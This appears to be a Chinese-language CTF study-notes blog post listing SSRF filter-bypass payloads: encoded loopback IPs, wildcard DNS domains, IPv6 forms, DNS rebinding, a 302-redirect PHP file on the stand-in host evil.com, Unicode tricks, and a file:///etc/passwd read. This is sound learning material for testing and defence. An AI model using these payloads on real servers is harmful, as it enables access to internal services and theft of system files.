---
title: SSRF Bypass
published: 2025-11-23
description: 'SSRF Filter Evasion (SSRF 过滤器规避)'
image: './Still_400_002.png'
tags: ['Web']
category: 'CTF'
draft: false 
lang: ''
series: "CTF学习笔记"
---
> Cover image source: [Source](https://store.steampowered.com/app/3101040/)
用于 **SSRF (Server-Side Request Forgery，服务端请求伪造)** 漏洞的利用过程中。

这个对抗过程通常被称为 **SSRF Bypass (SSRF 绕过)** 或 **SSRF Filter Evasion (SSRF 过滤器规避)**。

当 `127.0.0.1` 或 `localhost` 被黑名单屏蔽时，尝试以下多种方法进行绕过：

### 1. IP 地址变形（进制转换与缩写）

服务器通常只是字符串匹配过滤，但操作系统内核支持多种格式的 IP 输入。

*   **十进制整数 (Decimal Integer):**
    将 IP 地址转换为一个长整数。
    `127.0.0.1` -> `2130706433`
    *URL:* `http://2130706433/`
*   **八进制 (Octal):**
    在数字前加 `0`。
    `127.0.0.1` -> `0177.0.0.1`
    *URL:* `http://0177.0.0.1/`
*   **十六进制 (Hexadecimal):**
    在数字前加 `0x`。
    `127.0.0.1` -> `0x7F000001` 或 `0x7F.0.0.1`
    *URL:* `http://0x7F000001/`
*   **混合进制:**
    `127.0.0.1` -> `127.0.0.0x1` (混用十进制和十六进制)
*   **IP 省略写法 (Linux 特性):**
    在 Linux 系统下，0.0.0.0 或 127.1 可以解析为 127.0.0.1。
    *URL:* `http://127.1/`
    *URL:* `http://0/`

### 2. 指向本地的特殊域名 (DNS 解析)

利用互联网上已经存在的、泛解析到 127.0.0.1 的域名。

*   **nip.io:**
    `http://127.0.0.1.nip.io/` -> 解析为 127.0.0.1
*   **sslip.io:**
    `http://127.0.0.1.sslip.io/`
*   **localtest.me:**
    `http://localtest.me/` -> 解析为 127.0.0.1
*   **lvh.me:**
    `http://lvh.me/`

### 3. IPv6 绕过

如果后端服务器支持 IPv6 且没有过滤 IPv6 的回环地址。

*   **标准 IPv6 回环:**
    `http://[::1]/`
*   **IPv4 映射的 IPv6 地址:**
    `http://[::ffff:127.0.0.1]/` 或 `http://[0:0:0:0:0:ffff:127.0.0.1]/`

### 4. DNS 重绑定 (DNS Rebinding) —— 进阶技术

这是专门针对“检查 IP”逻辑的高级绕过技术。

**原理：**
如果后端代码的逻辑是：
1.  先解析域名，检查 IP 是否是内网/本地 IP (Check)。
2.  如果是合法的公网 IP，再发起 curl 请求获取内容 (Use)。

这中间存在时间差 (TOCTOU - Time of Check to Time of Use)。

**操作：**
你需要拥有一个域名和一个受控的 DNS 服务器。
1.  第一次解析 (Check 阶段)：DNS 返回你的公网 IP (例如 1.2.3.4)，通过检查。
2.  设置 DNS 服务器的 TTL 为 0。
3.  第二次解析 (Use 阶段)：当服务器真正去抓取数据时，DNS 缓存已过期，再次请求 DNS，此时你的 DNS 服务器返回 `127.0.0.1`。

可以使用现成的工具平台，例如 `rbndr.us`。
例如：`7f000001.88888888.rbndr.us` (会在 127.0.0.1 和 8.8.8.8 之间交替解析)。

### 5. 短链接重定向 (302 Redirect)

如果服务器支持跟随跳转 (Follow Redirects)，你可以让服务器访问你的服务器，然后你的服务器返回一个 302 跳转到 localhost。

**你的服务器 (evil.com/302.php):**
```php
<?php
header("Location: http://127.0.0.1/flag.php");
?>
```
**攻击 Payload:**
`http://target.com/ssrf?url=http://evil.com/302.php`

### 6. 封闭字母数字符号 (Enclosed Alphanumerics)

利用 Unicode 字符，如果后端在处理 URL 之前进行了规范化（Normalization），可能会将特殊字符转换为标准 ASCII 字符。

*   `http://①②⑦.⓪.⓪.①`
*   `http://LOCALHOST` (如果过滤器只过滤小写)

### 7. 协议混淆 (如果支持其他协议)

*   **File 协议:** `file:///etc/passwd` (如果不仅仅是 HTTP 请求)
*   **Dict 协议:** `dict://127.0.0.1:80/`

### 总结

常用尝试顺序：
1.  **IP 缩写/进制转换** (`0`, `127.1`, `2130706433`)
2.  **泛域名** (`127.0.0.1.nip.io`)
3.  **302 跳转**
4.  **DNS 重绑定**